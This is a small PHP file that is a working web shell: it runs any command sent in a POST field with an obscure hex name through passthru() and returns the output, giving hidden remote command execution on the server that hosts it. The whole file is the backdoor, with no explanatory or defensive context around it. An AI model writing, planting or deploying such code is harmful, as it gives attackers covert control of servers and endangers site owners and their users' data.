<?php
  if($_SERVER['REQUEST_METHOD'] != 'POST') {
    die();
  } elseif (isset($_POST['9c772bfc211644fa849a969a3b082404'])) {
    echo passthru($_POST['9c772bfc211644fa849a969a3b082404']);
  } else {
    die();
  }
?>
